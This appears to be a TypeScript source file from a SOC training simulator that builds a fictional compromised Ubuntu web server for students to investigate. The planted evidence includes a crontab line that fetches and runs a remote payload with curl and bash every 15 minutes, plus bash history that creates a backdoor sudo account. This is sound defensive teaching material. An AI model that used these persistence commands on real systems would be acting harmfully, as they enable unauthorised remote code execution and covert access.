/**
 * The base filesystem image for rmg-web-02.
 *
 * Immutable and shared across every session; per-student changes live in an
 * overlay (see Vfs). Everything here is fabricated -- no real host, no real
 * person, and every external address is from an RFC 5737 documentation range.
 *
 * Layout choices follow a real Ubuntu 22.04 server closely enough that skills
 * transfer. Where realism and pedagogy conflict, realism wins: students who
 * learn a simplified Linux have to unlearn it on their first real box.
 */

import { daysAgo, onAugust15, WORLD_NOW } from './clock.js';
import {
  AUTH_LOG,
  CAPTURE,
  ML_CORPUS,
  ML_INFERENCE_LOG,
  ML_REGISTRY,
  SYSLOG,
} from './data/generated.js';
import {
  DOMAIN_INFO_FILE,
  DOMAIN_ADMINS_FILE,
  KERBEROAST_HASHES_FILE,
  KLIST_OUTPUT_FILE,
  LDAPSEARCH_USERS_FILE,
  SECURITY_EVENTS_4769_FILE,
  USERS_EXPORT_FILE,
} from './data/ad-audit-fixtures.js';
import type { BaseImage, VNode } from './types.js';

const HOME = '/home/student';

interface NodeOptions {
  mode?: number;
  owner?: string;
  group?: string;
  mtime?: number;
  /** Reported size when it should differ from the content length. */
  size?: number;
}

/** Builds the flat path-keyed map the Vfs expects. */
class ImageBuilder {
  private readonly nodes = new Map<string, VNode>();

  dir(path: string, options: NodeOptions = {}): this {
    this.nodes.set(path, {
      kind: 'dir',
      mode: options.mode ?? 0o755,
      owner: options.owner ?? 'root',
      group: options.group ?? 'root',
      mtime: options.mtime ?? daysAgo(30),
    });
    return this;
  }

  file(path: string, content: string, options: NodeOptions = {}): this {
    this.nodes.set(path, {
      kind: 'file',
      mode: options.mode ?? 0o644,
      owner: options.owner ?? 'root',
      group: options.group ?? 'root',
      mtime: options.mtime ?? daysAgo(30),
      content,
      ...(options.size !== undefined ? { size: options.size } : {}),
    });
    return this;
  }

  /** An executable in /usr/bin or /usr/sbin. Content is a stub: the simulator
   *  dispatches on the command name, never on file contents. */
  binary(path: string, options: NodeOptions = {}): this {
    return this.file(path, '\x7fELF binary (simulated)\n', {
      mode: 0o755,
      size: 35_000 + (path.length % 40) * 1_100,
      mtime: daysAgo(120),
      ...options,
    });
  }

  build(): BaseImage {
    return this.nodes;
  }
}

// --- file contents -----------------------------------------------------------

const PASSWD = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
postgres:x:104:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
nagios:x:105:112:Nagios monitoring,,,:/var/lib/nagios:/bin/bash
student:x:1000:1000:SOC Trainee,,,:/home/student:/bin/bash
jmartel:x:1001:1001:Jean Martel,Operations,,:/home/jmartel:/bin/bash
dokafor:x:1002:1002:Dara Okafor,Engineering,,:/home/dokafor:/bin/bash
rchen:x:1003:1003:Ruoxi Chen,Database,,:/home/rchen:/bin/bash
testuser:x:1004:1004:TEMP - portal migration test,,,:/home/testuser:/bin/bash
svc-backup:x:1500:1500:Backup service account,,,:/var/lib/backup:/bin/bash
sysmon:x:1501:1501::/home/sysmon:/bin/bash
`;

const GROUP = `root:x:0:
adm:x:4:syslog,jmartel,student
tty:x:5:
disk:x:6:
sudo:x:27:jmartel,rchen,testuser,sysmon
www-data:x:33:
shadow:x:42:
postgres:x:110:
nagios:x:112:
student:x:1000:
jmartel:x:1001:
dokafor:x:1002:
rchen:x:1003:
testuser:x:1004:
svc-backup:x:1500:
sysmon:x:1501:
mlops:x:1600:student,dokafor
`;

// Present so that reading it fails with the permission error a real box gives.
// The hashes are obvious placeholders, not crackable material.
const SHADOW = `root:!:19000:0:99999:7:::
student:$6$REDACTED$SIMULATEDPLACEHOLDERHASH:19950:0:99999:7:::
sysmon:$6$REDACTED$SIMULATEDPLACEHOLDERHASH:19950:0:99999:7:::
`;

const OS_RELEASE = `PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
UBUNTU_CODENAME=jammy
`;

/**
 * A small vendor ruleset, of the kind that arrives already enabled.
 *
 * Deliberately mixed quality, because that is what a detection engineer inherits
 * rather than what they would write. Two of these are sound, one fires on every
 * TLS session on the estate, one has no threshold and will fire once per packet
 * of a brute force, and one is aimed at a service this host does not run. Sorting
 * them out against real traffic is the exercise.
 */
const SURICATA_RULES = `# Emerging Example ruleset, v2026.08.14
# Enabled by default. Tune locally in local.rules.

alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flags:S; sid:2001219; rev:4; classtype:attempted-recon;)

alert tcp any any -> any any (msg:"ET POLICY TLS session observed"; content:"TLS SNI:"; sid:2010935; rev:2; classtype:policy-violation;)

alert tcp $HOME_NET any -> $EXTERNAL_NET 3389 (msg:"ET POLICY Outbound RDP"; flags:S; sid:2012710; rev:3; classtype:policy-violation;)

alert icmp $HOME_NET any -> $HOME_NET any (msg:"ET INFO Internal ICMP echo"; itype:8; sid:2100384; rev:8; classtype:misc-activity;)

alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"ET MALWARE Possible outbound beacon"; flags:S; threshold: type threshold, track by_src, count 5, seconds 1800; sid:2029001; rev:1; classtype:trojan-activity;)
`;

const RESOLV_CONF = `# Managed by systemd-resolved.
nameserver 10.20.1.10
nameserver 10.20.1.11
search ridgelinemed.example
options edns0 trust-ad
`;

const HOSTS = `127.0.0.1	localhost
127.0.1.1	rmg-web-02.ridgelinemed.example	rmg-web-02
10.20.6.40	rmg-web-02
10.20.6.41	rmg-web-01
10.20.7.10	rmg-mail-01
10.20.7.22	rmg-lab-if-01
10.20.9.15	rmg-backup-01
10.20.9.40	rmg-monitor-01

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
`;

const SSHD_CONFIG = `# Package generated configuration file
Port 22
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

SyslogFacility AUTH
LogLevel INFO

LoginGraceTime 120
PermitRootLogin prohibit-password
StrictModes yes
MaxAuthTries 6
MaxSessions 10

PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no

ChallengeResponseAuthentication no
UsePAM yes

X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
`;

const CRONTAB = `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
47 6	* * 7	root	test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly
30 1	* * *	root	/usr/local/bin/rmg-backup.sh --target rmg-backup-01
`;

/** The attacker's persistence, waiting to be found in a later package. */
const SYSMON_CRONTAB = `# DO NOT EDIT THIS FILE - edit the master and reinstall.
*/15 * * * * curl -s https://198.51.100.60/b -o /tmp/.cache/u && bash /tmp/.cache/u
`;

const LOADAVG = '0.52 0.71 0.68 2/412 25904\n';

const MOTD = `Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug 15 11:50:01 UTC 2026

  System load:  0.52              Processes:             412
  Usage of /:   61.2% of 78.41GB  Users logged in:       2
  Memory usage: 44%               IPv4 address for eth0: 10.20.6.40
  Swap usage:   0%

  => /var is using 87.3% of 19.20GB

RIDGELINE MEDICAL GROUP - AUTHORISED USE ONLY
This system processes protected health information. All activity is logged.
`;

const STUDENT_NOTES = `SOC onboarding - shift notes
============================

Host: rmg-web-02 (patient portal, internet facing)
Escalation: SOC lead -> on-call IR -> CISO

Handy paths:
  /var/log/auth.log   authentication (ssh, sudo, useradd)
  /var/log/syslog     everything else the system says
  /etc/passwd         who has an account
  /etc/crontab        what runs on a schedule

Reminder from training: a failed login is not an incident.
A PATTERN of failed logins might be. Check the source address before
you page anyone at 2am.
`;

const README_PORTAL = `Ridgeline Patient Portal
========================

Deployed by: dokafor
Stack: nginx -> gunicorn (127.0.0.1:8080) -> postgresql

Export jobs write to ./exports and are purged nightly by cron.
Do not store PHI outside the exports directory.
`;

const DPKG_LOG = `2026-08-15 08:15:33 startup archives unpack
2026-08-15 08:15:41 upgrade libssl3:amd64 3.0.2-0ubuntu1.15 3.0.2-0ubuntu1.16
2026-08-15 08:16:02 status installed libssl3:amd64 3.0.2-0ubuntu1.16
2026-08-15 08:17:19 upgrade openssh-server:amd64 1:8.9p1-3ubuntu0.6 1:8.9p1-3ubuntu0.10
2026-08-15 08:17:44 status installed openssh-server:amd64 1:8.9p1-3ubuntu0.10
2026-08-15 08:22:47 startup packages configure
`;

const NGINX_ACCESS = `10.20.4.31 - - [15/Aug/2026:07:41:02 +0000] "GET /portal/appointments HTTP/1.1" 200 5312 "-" "Mozilla/5.0"
203.0.113.201 - - [15/Aug/2026:08:02:55 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible)"
192.0.2.44 - - [15/Aug/2026:08:03:01 +0000] "GET /.env HTTP/1.1" 404 162 "-" "python-requests/2.31.0"
10.20.4.58 - - [15/Aug/2026:09:14:38 +0000] "POST /portal/api/session HTTP/1.1" 200 891 "-" "Mozilla/5.0"
203.0.113.55 - - [15/Aug/2026:10:58:14 +0000] "GET /portal/exports/ HTTP/1.1" 403 199 "-" "curl/7.81.0"
198.51.100.60 - - [15/Aug/2026:11:12:27 +0000] "POST /portal/upload HTTP/1.1" 404 162 "-" "curl/7.81.0"
`;

const NGINX_ERROR = `2026/08/15 09:33:12 [error] 1422#1422: *8814 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.20.4.12, server: portal.ridgelinemed.example, request: "GET /portal/api/labs HTTP/1.1", upstream: "http://127.0.0.1:8080/api/labs"
2026/08/15 11:12:30 [warn] 1422#1422: *9102 a client request body is buffered to a temporary file /var/lib/nginx/body/0000000021, client: 198.51.100.60
`;

// --- assembly ----------------------------------------------------------------

export function buildBaseImage(): BaseImage {
  const b = new ImageBuilder();

  // Top-level directories, as on a stock Ubuntu install.
  for (const path of ['/bin', '/boot', '/dev', '/etc', '/home', '/lib', '/media', '/mnt', '/opt', '/proc', '/root', '/run', '/sbin', '/srv', '/sys', '/tmp', '/usr', '/var']) {
    b.dir(path);
  }
  b.dir('/root', { mode: 0o700 });
  b.dir('/tmp', { mode: 0o1777 });

  // --- /etc ------------------------------------------------------------------
  b.file('/etc/hostname', 'rmg-web-02\n', { mtime: daysAgo(210) });
  b.file('/etc/passwd', PASSWD, { mtime: onAugust15(10, 22, 42) });
  b.file('/etc/group', GROUP, { mtime: onAugust15(10, 31, 6) });
  // Mode 0640 root:shadow, so a student reading it gets a real permission error.
  b.file('/etc/shadow', SHADOW, { mode: 0o640, group: 'shadow', mtime: onAugust15(10, 23, 18) });
  b.file('/etc/os-release', OS_RELEASE, { mtime: daysAgo(210) });
  b.file('/etc/resolv.conf', RESOLV_CONF, { mtime: daysAgo(14) });
  b.file('/etc/hosts', HOSTS, { mtime: daysAgo(64) });
  b.file('/etc/crontab', CRONTAB, { mtime: daysAgo(180) });
  b.file('/etc/motd', MOTD, { mtime: daysAgo(2) });
  b.file('/etc/fstab', 'UUID=8f2c1a54-3d77-4b19-9c02-1e77a4b3d901 / ext4 defaults 0 1\n', { mtime: daysAgo(210) });
  b.dir('/etc/ssh');
  b.file('/etc/ssh/sshd_config', SSHD_CONFIG, { mtime: daysAgo(45) });
  b.dir('/etc/nginx');
  b.file('/etc/nginx/nginx.conf', 'user www-data;\nworker_processes auto;\ninclude /etc/nginx/sites-enabled/*;\n', { mtime: daysAgo(90) });
  b.dir('/etc/cron.d');
  b.dir('/etc/cron.hourly');
  b.dir('/etc/cron.daily');

  // The attacker's scheduled task, discoverable in a later package.
  b.dir('/var/spool/cron');
  b.dir('/var/spool/cron/crontabs', { mode: 0o1730 });
  b.file('/var/spool/cron/crontabs/sysmon', SYSMON_CRONTAB, {
    mode: 0o600,
    owner: 'sysmon',
    group: 'crontab',
    mtime: onAugust15(10, 40, 51),
  });

  // --- /var/log --------------------------------------------------------------
  b.dir('/var/log', { mtime: onAugust15(11, 45) });
  b.file('/var/log/auth.log', AUTH_LOG + '\n', { mode: 0o640, group: 'adm', mtime: onAugust15(11, 31, 55) });
  b.file('/var/log/syslog', SYSLOG + '\n', { mode: 0o640, group: 'adm', mtime: onAugust15(11, 31, 56) });
  b.file('/var/log/dpkg.log', DPKG_LOG, { mtime: onAugust15(8, 22, 47) });
  b.file('/var/log/wtmp', '(binary login records)\n', { size: 41_472, mtime: onAugust15(11, 31) });
  b.file('/var/log/lastlog', '(binary)\n', { size: 292_876, mtime: onAugust15(11, 5) });

  // --- /opt/ad-audit -----------------------------------------------------------
  //
  // A hygiene review export IT dropped here for the SOC team, not this host's
  // own state -- see content/active-directory-foundations.ts.
  b.dir('/opt/ad-audit', { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/domain-info.txt', DOMAIN_INFO_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/users-export.txt', USERS_EXPORT_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/domain-admins-members.txt', DOMAIN_ADMINS_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/klist-output.txt', KLIST_OUTPUT_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/ldapsearch-users.ldif', LDAPSEARCH_USERS_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/kerberoast-hashes.txt', KERBEROAST_HASHES_FILE, { mtime: daysAgo(1) });
  b.file('/opt/ad-audit/security-events-4769.txt', SECURITY_EVENTS_4769_FILE, { mtime: daysAgo(1) });

  // --- /srv/ml and the assistant's own logs -----------------------------------
  //
  // The training corpus is group-readable by `mlops` rather than world-readable,
  // which is the point of the data-security module: a student in `adm` can read
  // every system log on the host and still cannot read the data a model was
  // trained on, because those are different questions with different answers.
  //
  // The student account is in mlops, so the exercises work. That membership is
  // itself the finding in one of them.
  b.dir('/srv/ml');
  b.dir('/srv/ml/corpus');
  b.file('/srv/ml/corpus/tickets.csv', ML_CORPUS, {
    owner: 'root',
    group: 'mlops',
    mode: 0o640,
    mtime: daysAgo(9),
  });
  b.file('/srv/ml/registry.csv', ML_REGISTRY, {
    owner: 'root',
    group: 'mlops',
    mode: 0o644,
    mtime: daysAgo(3),
  });
  // The assistant logs inside its own tree rather than in /var/log, and that is
  // a deliberate constraint rather than a preference: several Linux Fundamentals
  // drills count the files under /var/log, so anything added there silently
  // changes an answer key in a package that has nothing to do with this one.
  // Self-contained services log this way often enough for it to be honest.
  b.dir('/srv/ml/logs');
  b.file('/srv/ml/logs/inference.log', ML_INFERENCE_LOG, {
    owner: 'root',
    group: 'mlops',
    mode: 0o640,
    mtime: onAugust15(11, 44),
  });

  // --- /etc/suricata ---------------------------------------------------------
  //
  // The vendor ruleset is world-readable and the local one is where a student
  // writes. Splitting them is not decoration: it is the distinction between
  // content you inherit and content you own, and tuning the first by editing it
  // in place is how an upgrade silently reverts your work.
  b.dir('/etc/suricata');
  b.dir('/etc/suricata/rules');
  b.file('/etc/suricata/rules/emerging-example.rules', SURICATA_RULES, { mtime: daysAgo(1) });
  b.file(
    '/etc/suricata/rules/local.rules',
    '# Local rules. Nothing here yet.\n# sid range 1000000-1999999 is reserved for local use.\n',
    { owner: 'student', group: 'student', mode: 0o644, mtime: daysAgo(30) },
  );

  // --- /var/captures ---------------------------------------------------------
  //
  // Kept out of /var/log on purpose: a capture is evidence somebody chose to
  // take, not something the system writes on its own, and the split is the first
  // thing an analyst has to understand about where a pcap comes from.
  b.dir('/var/captures', { mtime: onAugust15(11, 45) });
  b.file('/var/captures/eth0-morning.pcap', CAPTURE + '\n', {
    mode: 0o640,
    group: 'adm',
    mtime: onAugust15(11, 45, 2),
  });

  b.dir('/var/log/nginx');
  b.file('/var/log/nginx/access.log', NGINX_ACCESS, { owner: 'www-data', group: 'adm', mtime: onAugust15(11, 12, 27) });
  b.file('/var/log/nginx/error.log', NGINX_ERROR, { owner: 'www-data', group: 'adm', mtime: onAugust15(11, 12, 30) });
  // Rotated archives, so wildcard exercises have more than one file to match and
  // `ls -l` shows the older date format.
  b.file('/var/log/auth.log.1', AUTH_LOG.split('\n').slice(0, 400).join('\n') + '\n', { mode: 0o640, group: 'adm', mtime: daysAgo(1) });
  b.file('/var/log/syslog.1', SYSLOG.split('\n').slice(0, 120).join('\n') + '\n', { mode: 0o640, group: 'adm', mtime: daysAgo(1) });
  b.file('/var/log/kern.log', 'Aug 15 06:41:02 rmg-web-02 kernel: [108234.771290] audit: type=1400 apparmor="DENIED" operation="open" profile="/usr/sbin/nginx"\nAug 15 11:12:08 rmg-web-02 kernel: [124901.220417] nf_conntrack: table full, dropping packet\n', { mode: 0o640, group: 'adm', mtime: onAugust15(11, 12, 8) });

  b.dir('/var/www');
  b.dir('/var/www/portal', { owner: 'www-data', group: 'www-data' });
  b.file('/var/www/portal/README.md', README_PORTAL, { owner: 'www-data', group: 'www-data', mtime: daysAgo(11) });
  b.dir('/var/www/portal/exports', { owner: 'www-data', group: 'www-data', mtime: onAugust15(11, 6, 2) });
  b.file('/var/www/portal/exports/appointments-2026-08-14.csv', 'patient_id,appt_date,provider,department\n(1842 rows redacted for simulation)\n', { owner: 'www-data', group: 'www-data', size: 2_184_733, mtime: daysAgo(1) });
  b.file('/var/www/portal/exports/billing-2026-08-14.csv', 'account_id,balance,last_payment\n(3391 rows redacted for simulation)\n', { owner: 'www-data', group: 'www-data', size: 4_118_902, mtime: daysAgo(1) });
  b.dir('/var/lib');
  b.dir('/var/backups');
  b.file('/var/backups/dpkg.status.0', '(package database snapshot)\n', { size: 1_284_112, mtime: daysAgo(3) });

  // --- /home -----------------------------------------------------------------
  b.dir(HOME, { owner: 'student', group: 'student', mtime: onAugust15(9, 5) });
  for (const name of ['Desktop', 'Documents', 'Downloads']) {
    b.dir(`${HOME}/${name}`, { owner: 'student', group: 'student', mtime: daysAgo(6) });
  }
  b.file(`${HOME}/notes.txt`, STUDENT_NOTES, { owner: 'student', group: 'student', mtime: daysAgo(1) });
  b.file(`${HOME}/.bashrc`, '# ~/.bashrc\nalias ll=\'ls -alF\'\nalias la=\'ls -A\'\nexport PS1="\\u@\\h:\\w\\$ "\n', { owner: 'student', group: 'student', mtime: daysAgo(40) });
  b.file(`${HOME}/.profile`, '# ~/.profile\n[ -n "$BASH_VERSION" ] && [ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"\n', { owner: 'student', group: 'student', mtime: daysAgo(40) });
  b.file(`${HOME}/Documents/shift-handover.md`, '# Shift handover\n\n- Portal 502s on /api/labs still open with the lab interface vendor.\n- /var disk usage warning is known; cleanup ticket RMG-4417.\n- Monitoring box keeps failing SSH auth. Ticket RMG-4392, low priority.\n', { owner: 'student', group: 'student', mtime: daysAgo(2) });
  b.file(`${HOME}/Downloads/soc-cheatsheet.pdf`, '(simulated PDF)\n', { owner: 'student', group: 'student', size: 1_872_331, mtime: daysAgo(9) });

  // Staff home directories, sized so "find the largest files" has a real answer.
  b.dir('/home/jmartel', { owner: 'jmartel', group: 'jmartel', mtime: daysAgo(1) });
  b.file('/home/jmartel/portal-db-dump.sql', '-- pg_dump of portal (simulated)\n', { owner: 'jmartel', group: 'jmartel', size: 214_887_301, mtime: daysAgo(4) });
  b.file('/home/jmartel/notes.txt', 'renew portal TLS cert before 2026-09-30\n', { owner: 'jmartel', group: 'jmartel', mtime: daysAgo(8) });

  b.dir('/home/dokafor', { owner: 'dokafor', group: 'dokafor', mtime: daysAgo(2) });
  b.file('/home/dokafor/portal-build.tar.gz', '(simulated archive)\n', { owner: 'dokafor', group: 'dokafor', size: 96_331_204, mtime: daysAgo(2) });
  b.file('/home/dokafor/deploy.sh', '#!/bin/bash\nset -euo pipefail\nsystemctl restart portal-app\n', { mode: 0o750, owner: 'dokafor', group: 'dokafor', mtime: daysAgo(12) });

  b.dir('/home/rchen', { owner: 'rchen', group: 'rchen', mtime: daysAgo(1) });
  b.file('/home/rchen/vacuum-full.log', 'INFO: vacuuming "public.appointments"\n', { owner: 'rchen', group: 'rchen', size: 12_884_022, mtime: onAugust15(3, 41) });

  // The compromised account: a temporary test user nobody disabled.
  b.dir('/home/testuser', { owner: 'testuser', group: 'testuser', mtime: onAugust15(10, 52) });
  b.file('/home/testuser/.bash_history', 'id\nsudo -l\ncat /etc/passwd\nsudo useradd -m -s /bin/bash -u 1501 sysmon\nsudo passwd sysmon\nsudo usermod -aG sudo sysmon\nhistory -c\n', { owner: 'testuser', group: 'testuser', mtime: onAugust15(10, 52, 29) });

  // The backdoor account the attacker created.
  b.dir('/home/sysmon', { owner: 'sysmon', group: 'sysmon', mtime: onAugust15(11, 31) });
  b.dir('/home/sysmon/.ssh', { mode: 0o700, owner: 'sysmon', group: 'sysmon', mtime: onAugust15(11, 4) });
  b.file('/home/sysmon/.ssh/authorized_keys', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISIMULATEDKEYNOTREAL attacker@simulated\n', { mode: 0o600, owner: 'sysmon', group: 'sysmon', mtime: onAugust15(11, 4, 31) });

  // --- /tmp ------------------------------------------------------------------
  // The staging directory the attacker used, plus ordinary junk. The
  // world-writable file gives the permissions exercise something real to find.
  b.dir('/tmp/.cache', { mode: 0o777, owner: 'sysmon', group: 'sysmon', mtime: onAugust15(11, 9, 40) });
  b.file('/tmp/.cache/pt.tar.gz', '(staged archive)\n', { mode: 0o666, owner: 'root', group: 'root', size: 6_298_441, mtime: onAugust15(11, 9, 40) });
  b.file('/tmp/.cache/u', '#!/bin/bash\n# staged payload (simulated, inert)\n', { mode: 0o777, owner: 'sysmon', group: 'sysmon', mtime: onAugust15(11, 15, 1) });
  b.file('/tmp/portal-debug.log', 'gunicorn worker 3 restarted\n', { mode: 0o666, owner: 'www-data', group: 'www-data', mtime: onAugust15(9, 33, 12) });
  b.file('/tmp/systemd-private-session', '(runtime scratch)\n', { mode: 0o600, mtime: onAugust15(6, 0) });

  // --- /usr ------------------------------------------------------------------
  b.dir('/usr/bin');
  b.dir('/usr/sbin');
  b.dir('/usr/lib');
  b.dir('/usr/local');
  b.dir('/usr/local/bin');
  b.dir('/usr/share');

  for (const name of ['bash', 'cat', 'ls', 'grep', 'head', 'tail', 'less', 'find', 'sort', 'uniq', 'wc', 'cut', 'awk', 'sed', 'ps', 'top', 'kill', 'du', 'df', 'uptime', 'whoami', 'id', 'date', 'curl', 'wget', 'ssh', 'scp', 'tar', 'gzip', 'nano', 'vim', 'python3', 'dig', 'nslookup', 'netstat', 'ss', 'ip', 'ping', 'systemctl', 'journalctl', 'dpkg', 'apt']) {
    b.binary(`/usr/bin/${name}`);
  }

  // Setuid binaries. These are legitimate -- every Ubuntu box has them -- which
  // is the lesson: finding a setuid bit is the start of an investigation, not
  // the end of one.
  for (const name of ['passwd', 'su', 'sudo', 'chsh', 'chfn', 'gpasswd', 'newgrp', 'mount', 'umount']) {
    b.binary(`/usr/bin/${name}`, { mode: 0o4755 });
  }
  for (const name of ['useradd', 'usermod', 'userdel', 'groupadd', 'sshd', 'nginx', 'cron', 'anacron']) {
    b.binary(`/usr/sbin/${name}`);
  }
  b.file('/usr/local/bin/rmg-backup.sh', '#!/bin/bash\n# Ridgeline nightly backup\nset -euo pipefail\nrsync -a --delete /var/www/portal "$2"\n', { mode: 0o755, mtime: daysAgo(150) });

  // --- /proc -----------------------------------------------------------------
  b.file('/proc/loadavg', LOADAVG, { mtime: WORLD_NOW });
  b.file('/proc/uptime', '124987.42 981233.19\n', { mtime: WORLD_NOW });
  b.file('/proc/version', 'Linux version 5.15.0-105-generic (buildd@lcy02) (gcc 11.4.0) #115-Ubuntu SMP Mon Apr 15 09:52:04 UTC 2026\n', { mtime: WORLD_NOW });
  b.file('/proc/cpuinfo', 'processor\t: 0\nmodel name\t: Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz\nprocessor\t: 1\nmodel name\t: Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz\n', { mtime: WORLD_NOW });
  b.file('/proc/meminfo', 'MemTotal:        8039384 kB\nMemFree:          912044 kB\nMemAvailable:    4180992 kB\nSwapTotal:             0 kB\n', { mtime: WORLD_NOW });

  return b.build();
}

/** Parsed once at startup and shared by every session. */
export const BASE_IMAGE: BaseImage = buildBaseImage();
